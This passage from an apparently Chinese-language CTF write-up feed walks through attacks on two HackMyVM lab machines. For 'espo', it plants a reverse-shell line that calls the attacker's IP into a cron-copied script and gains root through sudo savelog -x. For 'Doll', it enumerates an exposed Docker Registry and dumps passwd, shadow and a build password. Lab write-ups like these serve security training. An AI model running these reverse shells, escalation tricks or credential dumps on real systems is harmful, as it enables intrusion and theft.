drwxr-xr-x  3 mandie mandie 4096 Dec  4  2023 .local
drwxr-xr-x 12 mandie mandie 4096 Dec  4  2023 .oh-my-zsh
-rw-r--r--  1 mandie mandie  807 Dec  4  2023 .profile
-rw-r--r--  1 mandie mandie 3890 Dec  4  2023 .zshrc
-rwxr-xr--  1 mandie mandie  493 Dec  4  2023 copyPics
drwxr-xr-x  2 mandie mandie 4096 Jan  8 06:55 pictures
-rwx------  1 mandie mandie   33 Jan 24  2024 user.txt
drwxr-xr-x  2 mandie mandie 4096 Jan  8 06:55 videos
www-data@espo:/home/mandie$ cd copyPics 
bash: cd: copyPics: Not a directory
www-data@espo:/home/mandie$ cat copyPics 
#!/bin/bash

SOURCE_MEDIAS='/var/shared_medias'
PICTURES_DIR='$HOME/pictures'
VIDEOS_DIR='$HOME/videos'

/usr/bin/find '$SOURCE_MEDIAS' ! -executable -exec /usr/bin/cp {} '$HOME' 2&gt;/dev/null \;
mkdir -p '$PICTURES_DIR' '$VIDEOS_DIR'

declare -A directory_mappings
directory_mappings=( ['$PICTURES_DIR']='jpeg jpg' ['$VIDEOS_DIR']='mp4 avi' )

for dir in '${!directory_mappings[@]}'; do
    for ext in ${directory_mappings[$dir]}; do
        mv '$HOME'/*.$ext '$dir/' 2&gt;/dev/null
    done
done
www-data@espo:/home/mandie$ cd /tmp/
www-data@espo:/tmp$ wget 192.168.205.141/pspy
--2025-01-08 06:56:53--  http://192.168.205.141/pspy
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3518724 (3.4M) [application/octet-stream]
Saving to: 'pspy'

pspy                                                         0%[                                                                       pspy                                                       100%[========================================================================================================================================&gt;]   3.36M  --.-KB/s    in 0.02s   

2025-01-08 06:56:53 (172 MB/s) - 'pspy' saved [3518724/3518724]

www-data@espo:/tmp$ chmod +x pspy 
www-data@espo:/tmp$ ./pspy 
pspy - version: 1.2.1 - Commit SHA: kali


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░   
                               ░ ░   

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/01/08 06:57:08 CMD: UID=33    PID=2064   | ./pspy 
2025/01/08 06:57:08 CMD: UID=0     PID=2048   | /usr/bin/php -f cron.php 
2025/01/08 06:57:08 CMD: UID=0     PID=2047   | /bin/sh -c cd /var/www/html; /usr/bin/php -f cron.php &gt; /dev/null 2&gt;&amp;1 
2025/01/08 06:57:08 CMD: UID=0     PID=2044   | /usr/sbin/CRON -f 
2025/01/08 06:57:08 CMD: UID=33    PID=2015   | bash 
2025/01/08 06:57:08 CMD: UID=33    PID=2014   | sh -c bash 
2025/01/08 06:57:08 CMD: UID=33    PID=2013   | script /dev/null -c bash 
2025/01/08 06:57:08 CMD: UID=0     PID=2011   | 
2025/01/08 06:57:08 CMD: UID=33    PID=1990   | bash -i 
2025/01/08 06:57:08 CMD: UID=33    PID=1989   | bash -c bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1 
2025/01/08 06:57:08 CMD: UID=33    PID=1988   | sh -c bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1' 
2025/01/08 06:57:08 CMD: UID=0     PID=1935   | 
2025/01/08 06:57:08 CMD: UID=0     PID=1873   | 
2025/01/08 06:57:08 CMD: UID=0     PID=1808   | 
2025/01/08 06:57:08 CMD: UID=0     PID=1595   | 
2025/01/08 06:57:08 CMD: UID=0     PID=1273   | 
2025/01/08 06:57:08 CMD: UID=33    PID=1111   | php-fpm: pool www                                                           
2025/01/08 06:57:08 CMD: UID=109   PID=1042   | qmgr -l -t unix -u 
2025/01/08 06:57:08 CMD: UID=109   PID=1041   | pickup -l -t unix -u -c 
2025/01/08 06:57:08 CMD: UID=0     PID=1039   | /usr/lib/postfix/sbin/master -w 
2025/01/08 06:57:08 CMD: UID=108   PID=673    | /usr/sbin/mariadbd 
2025/01/08 06:57:08 CMD: UID=0     PID=629    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2025/01/08 06:57:08 CMD: UID=33    PID=609    | php-fpm: pool www                                                           
2025/01/08 06:57:08 CMD: UID=33    PID=608    | php-fpm: pool www                                                           
2025/01/08 06:57:08 CMD: UID=33    PID=544    | nginx: worker process                          
2025/01/08 06:57:08 CMD: UID=0     PID=540    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; 
2025/01/08 06:57:08 CMD: UID=0     PID=531    | /sbin/agetty -o -p -- \u --noclear - linux 
2025/01/08 06:57:08 CMD: UID=0     PID=509    | php-fpm: master process (/etc/php/8.2/fpm/php-fpm.conf)                     
2025/01/08 06:57:08 CMD: UID=0     PID=489    | /usr/sbin/ModemManager 
2025/01/08 06:57:08 CMD: UID=0     PID=461    | /sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev 
2025/01/08 06:57:08 CMD: UID=0     PID=432    | 
2025/01/08 06:57:08 CMD: UID=0     PID=421    | /lib/systemd/systemd-logind 
2025/01/08 06:57:08 CMD: UID=996   PID=414    | /usr/lib/polkit-1/polkitd --no-debug 
2025/01/08 06:57:08 CMD: UID=100   PID=411    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                                                                                                    
2025/01/08 06:57:08 CMD: UID=0     PID=410    | /usr/sbin/cron -f 
2025/01/08 06:57:08 CMD: UID=0     PID=389    | dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                                                                 
2025/01/08 06:57:08 CMD: UID=0     PID=303    | 
2025/01/08 06:57:08 CMD: UID=997   PID=284    | /lib/systemd/systemd-timesyncd 
2025/01/08 06:57:08 CMD: UID=0     PID=242    | /lib/systemd/systemd-udevd 
2025/01/08 06:57:08 CMD: UID=0     PID=218    | /lib/systemd/systemd-journald 
2025/01/08 06:57:08 CMD: UID=0     PID=174    | 
2025/01/08 06:57:08 CMD: UID=0     PID=173    | 
2025/01/08 06:57:08 CMD: UID=0     PID=141    | 
2025/01/08 06:57:08 CMD: UID=0     PID=134    | 
2025/01/08 06:57:08 CMD: UID=0     PID=133    | 
2025/01/08 06:57:08 CMD: UID=0     PID=132    | 
2025/01/08 06:57:08 CMD: UID=0     PID=131    | 
2025/01/08 06:57:08 CMD: UID=0     PID=130    | 
2025/01/08 06:57:08 CMD: UID=0     PID=129    | 
2025/01/08 06:57:08 CMD: UID=0     PID=126    | 
2025/01/08 06:57:08 CMD: UID=0     PID=59     | 
2025/01/08 06:57:08 CMD: UID=0     PID=58     | 
2025/01/08 06:57:08 CMD: UID=0     PID=53     | 
2025/01/08 06:57:08 CMD: UID=0     PID=48     | 
2025/01/08 06:57:08 CMD: UID=0     PID=47     | 
2025/01/08 06:57:08 CMD: UID=0     PID=46     | 
2025/01/08 06:57:08 CMD: UID=0     PID=44     | 
2025/01/08 06:57:08 CMD: UID=0     PID=38     | 
2025/01/08 06:57:08 CMD: UID=0     PID=37     | 
2025/01/08 06:57:08 CMD: UID=0     PID=36     | 
2025/01/08 06:57:08 CMD: UID=0     PID=35     | 
2025/01/08 06:57:08 CMD: UID=0     PID=34     | 
2025/01/08 06:57:08 CMD: UID=0     PID=33     | 
2025/01/08 06:57:08 CMD: UID=0     PID=32     | 
2025/01/08 06:57:08 CMD: UID=0     PID=31     | 
2025/01/08 06:57:08 CMD: UID=0     PID=30     | 
2025/01/08 06:57:08 CMD: UID=0     PID=29     | 
2025/01/08 06:57:08 CMD: UID=0     PID=28     | 
2025/01/08 06:57:08 CMD: UID=0     PID=27     | 
2025/01/08 06:57:08 CMD: UID=0     PID=24     | 
2025/01/08 06:57:08 CMD: UID=0     PID=23     | 
2025/01/08 06:57:08 CMD: UID=0     PID=22     | 
2025/01/08 06:57:08 CMD: UID=0     PID=21     | 
2025/01/08 06:57:08 CMD: UID=0     PID=20     | 
2025/01/08 06:57:08 CMD: UID=0     PID=18     | 
2025/01/08 06:57:08 CMD: UID=0     PID=16     | 
2025/01/08 06:57:08 CMD: UID=0     PID=15     | 
2025/01/08 06:57:08 CMD: UID=0     PID=14     | 
2025/01/08 06:57:08 CMD: UID=0     PID=13     | 
2025/01/08 06:57:08 CMD: UID=0     PID=12     | 
2025/01/08 06:57:08 CMD: UID=0     PID=11     | 
2025/01/08 06:57:08 CMD: UID=0     PID=10     | 
2025/01/08 06:57:08 CMD: UID=0     PID=6      | 
2025/01/08 06:57:08 CMD: UID=0     PID=5      | 
2025/01/08 06:57:08 CMD: UID=0     PID=4      | 
2025/01/08 06:57:08 CMD: UID=0     PID=3      | 
2025/01/08 06:57:08 CMD: UID=0     PID=2      | 
2025/01/08 06:57:08 CMD: UID=0     PID=1      | /sbin/init 
2025/01/08 06:58:01 CMD: UID=0     PID=2072   | /usr/sbin/CRON -f 
2025/01/08 06:58:01 CMD: UID=0     PID=2071   | /usr/sbin/cron -f 
2025/01/08 06:58:01 CMD: UID=0     PID=2073   | /usr/sbin/CRON -f 
2025/01/08 06:58:01 CMD: UID=0     PID=2075   | /usr/sbin/CRON -f 
2025/01/08 06:58:01 CMD: UID=0     PID=2077   | /bin/sh -c cd /var/www/html; /usr/bin/php -f cron.php &gt; /dev/null 2&gt;&amp;1 
2025/01/08 06:58:01 CMD: UID=1000  PID=2076   | /bin/sh -c /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2078   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2079   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2080   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2081   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2082   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2083   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2084   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2085   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2086   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2087   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2088   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2089   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2090   | /bin/bash /home/mandie/copyPics 
^CExiting program... (interrupt)

```

有定时任务用`UID1000`的用户执行`/home/mandie/copyPics`，`copyPics`的内容

```bash
www-data@espo:/home/mandie$ cat copyPics 
#!/bin/bash

SOURCE_MEDIAS='/var/shared_medias'
PICTURES_DIR='$HOME/pictures'
VIDEOS_DIR='$HOME/videos'

/usr/bin/find '$SOURCE_MEDIAS' ! -executable -exec /usr/bin/cp {} '$HOME' 2&gt;/dev/null \;
mkdir -p '$PICTURES_DIR' '$VIDEOS_DIR'

declare -A directory_mappings
directory_mappings=( ['$PICTURES_DIR']='jpeg jpg' ['$VIDEOS_DIR']='mp4 avi' )

for dir in '${!directory_mappings[@]}'; do
    for ext in ${directory_mappings[$dir]}; do
        mv '$HOME'/*.$ext '$dir/' 2&gt;/dev/null
    done
done
```

实现了从一个目录 `/var/shared_medias` 中筛选不可执行文件，并把文件复制到用户的家目录下。那我们可以尝试在`/var/shared_medias`中创建一个`copyPics`文件，并在里面加点料

```bash
www-data@espo:/tmp$ ls -la /var/shared_medias
total 7792
drwxrwxrwt  2 root root    4096 Jan 24  2024 .
drwxr-xr-x 13 root root    4096 Dec  7  2023 ..
-rw-r--r--  1 root root   61521 Dec  4  2023 bedroom.jpg
-rw-r--r--  1 root root  298808 Dec  4  2023 burger.jpeg
-rw-r--r--  1 root root  236712 Dec  4  2023 dad-baby.jpg
-rw-r--r--  1 root root   61324 Dec  4  2023 dorothy.jpeg
-rw-r--r--  1 root root  268188 Dec  4  2023 family.jpg
-rw-r--r--  1 root root  251902 Dec  4  2023 maldives.jpg
-rw-r--r--  1 root root 6779935 Dec  4  2023 sky.mp4
www-data@espo:/tmp$ cd /var/shared_medias
www-data@espo:/var/shared_medias$ cp /home/mandie/copyPics .
www-data@espo:/var/shared_medias$ nano copyPics 
www-data@espo:/var/shared_medias$ cat copyPics 
#!/bin/bash

SOURCE_MEDIAS='/var/shared_medias'
PICTURES_DIR='$HOME/pictures'
VIDEOS_DIR='$HOME/videos'

/usr/bin/find '$SOURCE_MEDIAS' ! -executable -exec /usr/bin/cp {} '$HOME' 2&gt;/dev/null \;
mkdir -p '$PICTURES_DIR' '$VIDEOS_DIR'

declare -A directory_mappings
directory_mappings=( ['$PICTURES_DIR']='jpeg jpg' ['$VIDEOS_DIR']='mp4 avi' )

for dir in '${!directory_mappings[@]}'; do
    for ext in ${directory_mappings[$dir]}; do
        mv '$HOME'/*.$ext '$dir/' 2&gt;/dev/null
    done
done


bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/9999 0&gt;&amp;1'
```

让子弹飞会

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
id
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.236] 43262
bash: cannot set terminal process group (2562): Inappropriate ioctl for device
bash: no job control in this shell
mandie@espo:~$ id
uid=1000(mandie) gid=1000(mandie) groups=1000(mandie),100(users)

```

获得一下稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

尝试提权

```bash
mandie@espo:~$ sudo -l
sudo: unable to resolve host espo: Name or service not known
Matching Defaults entries for mandie on espo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mandie may run the following commands on espo:
    (ALL : ALL) NOPASSWD: /usr/bin/savelog
mandie@espo:~$ /usr/bin/savelog -h
Usage: savelog [-m mode] [-u user] [-g group] [-t] [-c cycle] [-p]
             [-j] [-C] [-d] [-l] [-r rolldir] [-n] [-q] file ...
        -m mode    - chmod log files to mode
        -u user    - chown log files to user
        -g group   - chgrp log files to group
        -c cycle   - save cycle versions of the logfile (default: 7)
        -r rolldir - use rolldir instead of . to roll files
        -C         - force cleanup of cycled logfiles
        -d         - use standard date for rolling
        -D         - override date format for -d
        -t         - touch file
        -l         - don't compress any log files (default: compress)
        -p         - preserve mode/user/group of original file
        -j         - use bzip2 instead of gzip
        -J         - use xz instead of gzip
        -1 .. -9   - compression strength or memory usage (default: 9, except for xz)
        -x script  - invoke script with rotated log file in $FILE
        -n         - do not rotate empty files
        -q         - suppress rotation message
        file       - log file names

# 翻译
用法： savelog [-m 模式] [-u 用户] [-g 组] [-t] [-c 循环] [-p]
             [-j][-C][-d][-l][-r 滚动目录][-n][-q] 文件 ...
        -m mode - chmod 日志文件模式
        -u 用户 - 将日志文件上传到用户
        -g group - 要分组的 chgrp 日志文件
        -c cycle - 保存日志文件的循环版本（默认值：7）
        -r rolldir - 使用 rolldir 而不是 .滚动文件
        -C - 强制清理循环的日志文件
        -d - 使用标准日期进行滚动
        -D - 覆盖 -d 的日期格式
        -t - 触摸文件
        -l - 不压缩任何日志文件（默认：compress）
        -p - 保留原始文件的模式/用户/组
        -j - 使用 bzip2 而不是 gzip
        -J - 使用 xz 而不是 gzip
        -1 ..-9 - 压缩强度或内存使用率（默认值：9，xz 除外）
        -x script - 使用$FILE中旋转的日志文件调用脚本
        -n - 不旋转空文件
        -q - 禁止旋转消息
        file - 日志文件名

```

`-x`我们比较感兴趣，试试行不行

```bash
mandie@espo:~$ find / -name '*.log' 2&gt;/dev/null
/var/www/html/data/logs/espo-2023-12-04.log
/var/www/html/data/logs/espo-2025-01-08.log
/var/www/html/data/logs/espo-2024-01-24.log
/var/log/alternatives.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/dpkg.log
/var/log/php8.2-fpm.log
/var/lib/mysql/ddl_recovery-backup.log
/var/lib/mysql/ddl_recovery.log
mandie@espo:~$ sudo /usr/bin/savelog -x bash /var/log/nginx/access.log
sudo: unable to resolve host espo: Name or service not known
root@espo:/home/mandie# id
uid=0(root) gid=0(root) groups=0(root)
```

成功提权

# 5.后话

看了一下`HGBE`大佬的wp，才发现群主`ll104567`发现了一个定时任务直接获取 root

![image](https://github.com/user-attachments/assets/09639c30-986e-458a-89e8-7010827f3d1d)

甚至在`www-data`权限的时候就可以直接提权到`root`
![C4](https://github.com/user-attachments/assets/b1b76fe8-1a83-43f9-8ff3-ae2dc30f8a95)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_espo.html</guid><pubDate>Fri, 27 Jun 2025 09:33:05 +0000</pubDate></item><item><title>hmv_Doll</title><link>https://7r1UMPHK.github.io/post/hmv_Doll.html</link><description># hmv_Doll

# 0.闲聊

![image](assets/image-20250129201949-6vewhf4.png)

**靶机：** https://hackmyvm.eu/machines/machine.php?vm=Doll

**靶机 IP：** 192.168.72.129

**kali IP：** 192.168.72.128

今天年初二，有点空，更新一下wp

# 1.扫描

​`nmap`​开扫

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS -Pn -n -p- --min-rate 10000 192.168.72.129
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:16 EST
Nmap scan report for 192.168.72.129
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
1007/tcp open  unknown
MAC Address: 08:00:27:F7:F4:53 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
                                                                  
```

其中`1007`​不知道是什么服务，我们详细扫描一下

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sT -sV -Pn -n -p1007 192.168.72.129        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:17 EST
Nmap scan report for 192.168.72.129
Host is up (0.00039s latency).

PORT     STATE SERVICE VERSION
1007/tcp open  http    Docker Registry (API: 2.0)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds

```

不知道是什么东西，我们等会搜索一下

# 2.踩点

在**hacktricks**​上找到[5000 - Pentesting Docker Registry](https://book.hacktricks.wiki/zh/network-services-pentesting/5000-pentesting-docker-registry.html)这篇文章

![image](assets/image-20250129202845-u4dct3k.png)

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.72.129:1007/v2/_catalog
{'repositories':['dolly']}
                              
```

继续利用

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.72.129:1007/v2/dolly/tags/list
{'name':'dolly','tags':['latest']}
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.72.129:1007/v2/dolly/manifests/latest
{
   'schemaVersion': 1,
   'name': 'dolly',
   'tag': 'latest',
   'architecture': 'amd64',
   'fsLayers': [
      {
         'blobSum': 'sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017'
      },
      {
         'blobSum': 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'
      },
      {
         'blobSum': 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'
      },
      {
         'blobSum': 'sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09'
      }
   ],
   'history': [
      {
         'v1Compatibility': '{\'architecture\':\'amd64\',\'config\':{\'Hostname\':\'10ddd4608cdf\',\'Domainname\':\'\',\'User\':\'\',\'AttachStdin\':true,\'AttachStdout\':true,\'AttachStderr\':true,\'Tty\':true,\'OpenStdin\':true,\'StdinOnce\':true,\'Env\':[\'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\'],\'Cmd\':[\'/bin/sh\'],\'Image\':\'doll\',\'Volumes\':null,\'WorkingDir\':\'\',\'Entrypoint\':null,\'OnBuild\':null,\'Labels\':{}},\'container\':\'10ddd4608cdfd81cd95111ecfa37499635f430b614fa326a6526eef17a215f06\',\'container_config\':{\'Hostname\':\'10ddd4608cdf\',\'Domainname\':\'\',\'User\':\'\',\'AttachStdin\':true,\'AttachStdout\':true,\'AttachStderr\':true,\'Tty\':true,\'OpenStdin\':true,\'StdinOnce\':true,\'Env\':[\'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\'],\'Cmd\':[\'/bin/sh\'],\'Image\':\'doll\',\'Volumes\':null,\'WorkingDir\':\'\',\'Entrypoint\':null,\'OnBuild\':null,\'Labels\':{}},\'created\':\'2023-04-25T08:58:11.460540528Z\',\'docker_version\':\'23.0.4\',\'id\':\'89cefe32583c18fc5d6e6a5ffc138147094daac30a593800fe5b6615f2d34fd6\',\'os\':\'linux\',\'parent\':\'1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\'}'
      },
      {
         'v1Compatibility': '{\'id\':\'1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\',\'parent\':\'638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\',\'comment\':\'buildkit.dockerfile.v0\',\'created\':\'2023-03-29T18:19:24.45578926Z\',\'container_config\':{\'Cmd\':[\'ARG passwd=devilcollectsit\']},\'throwaway\':true}'
      },
      {
         'v1Compatibility': '{\'id\':\'638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\',\'parent\':\'cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\',\'created\':\'2023-03-29T18:19:24.45578926Z\',\'container_config\':{\'Cmd\':[\'/bin/sh -c #(nop)  CMD [\\\'/bin/sh\\\']\']},\'throwaway\':true}'
      },
      {
         'v1Compatibility': '{\'id\':\'cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\',\'created\':\'2023-03-29T18:19:24.348438709Z\',\'container_config\':{\'Cmd\':[\'/bin/sh -c #(nop) ADD file:9a4f77dfaba7fd2aa78186e4ef0e7486ad55101cefc1fabbc1b385601bb38920 in / \']}}'
      }
   ],
   'signatures': [
      {
         'header': {
            'jwk': {
               'crv': 'P-256',
               'kid': 'X7W5:IVTA:CKTP:A6JJ:IMVJ:FOTQ:OO4M:CB4C:6JYB:PX6R:DQ6C:JPGS',
               'kty': 'EC',
               'x': 'm6jL0NHxYkVUo0-ID-HLzT0Y3OqOeOBvekpF98kC-4c',
               'y': 'WlToBayTJ8f4zcry3wiq1fMvedgRkuwE7Oycza83_YA'
            },
            'alg': 'ES256'
         },
         'signature': 'n75fkjkUhAvtqrT2JfMVuBUtIUgiZ0ZhgYmM4m9kqOHprKnq7YrMyNKYYTntkxDmN2uW2w_3o36LvmRW7KzyOg',
         'protected': 'eyJmb3JtYXRMZW5ndGgiOjI4MjksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNS0wMS0zMFQwMToyOTo0NVoifQ'
      }
   ]
}                                                                                                                                     

┌──(kali㉿kali)-[~/test]
└─$ mkdir tmp     
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cd tmp 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ curl http://192.168.72.129:1007/v2/dolly/blobs/sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017 -o blob1.tar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3707  100  3707    0     0   971k      0 --:--:-- --:--:-- --:--:-- 1206k
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ tar -xf blob1.tar
                         
┌──(kali㉿kali)-[~/test/tmp]
└─$ ls -la
总计 24
drwxrwxr-x 5 kali kali 4096  1月29日 20:32 .
drwxrwxr-x 4 kali kali 4096  1月29日 20:32 ..
-rw-rw-r-- 1 kali kali 3707  1月29日 20:32 blob1.tar
drwxr-xr-x 2 kali kali 4096 2023年 4月25日 etc
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 home
drwx------ 2 kali kali 4096 2023年 4月25日 root
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ cd etc 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/etc]
└─$ ls -al
总计 32
drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .
drwxrwxr-x 5 kali kali 4096  1月29日 20:32 ..
-rw-r--r-- 1 kali kali  710 2023年 4月25日 group
-rw-r--r-- 1 kali kali  697 2022年11月 4日 group-
-rw-r--r-- 1 kali kali 1223 2023年 4月25日 passwd
-rw-r--r-- 1 kali kali 1223 2023年 4月25日 passwd-
-rw-r----- 1 kali kali  553 2023年 4月25日 shadow
-rw-r----- 1 kali kali  448 2023年 4月25日 shadow-
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/etc]
└─$ cat *   
root:x:0:root
bin:x:1:root,bin,daemon
daemon:x:2:root,bin,daemon
sys:x:3:root,bin,adm
adm:x:4:root,adm,daemon
tty:x:5:
disk:x:6:root,adm
lp:x:7:lp
mem:x:8:
kmem:x:9:
wheel:x:10:root
floppy:x:11:root
mail:x:12:mail
news:x:13:news
uucp:x:14:uucp
man:x:15:man
cron:x:16:cron
console:x:17:
audio:x:18:
cdrom:x:19:
dialout:x:20:root
ftp:x:21:
sshd:x:22:
input:x:23:
at:x:25:at
tape:x:26:root
video:x:27:root
netdev:x:28:
readproc:x:30:
squid:x:31:squid
xfs:x:33:xfs
kvm:x:34:kvm
games:x:35:
shadow:x:42:
cdrw:x:80:
www-data:x:82:
usb:x:85:
vpopmail:x:89:
users:x:100:games
ntp:x:123:
nofiles:x:200:
smmsp:x:209:smmsp
locate:x:245:
abuild:x:300:
utmp:x:406:
ping:x:999:
nogroup:x:65533:
nobody:x:65534:
bela:x:1000:
root:x:0:root
bin:x:1:root,bin,daemon
daemon:x:2:root,bin,daemon
sys:x:3:root,bin,adm
adm:x:4:root,adm,daemon
tty:x:5:
disk:x:6:root,adm
lp:x:7:lp
mem:x:8:
kmem:x:9:
wheel:x:10:root
floppy:x:11:root
mail:x:12:mail
news:x:13:news
uucp:x:14:uucp
man:x:15:man
cron:x:16:cron
console:x:17:
audio:x:18:
cdrom:x:19:
dialout:x:20:root
ftp:x:21:
sshd:x:22:
input:x:23:
at:x:25:at
tape:x:26:root
video:x:27:root
netdev:x:28:
readproc:x:30:
squid:x:31:squid
xfs:x:33:xfs
kvm:x:34:kvm
games:x:35:
shadow:x:42:
cdrw:x:80:
www-data:x:82:
usb:x:85:
vpopmail:x:89:
users:x:100:games
ntp:x:123:
nofiles:x:200:
smmsp:x:209:smmsp
locate:x:245:
abuild:x:300:
utmp:x:406:
ping:x:999:
nogroup:x:65533:
nobody:x:65534:
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
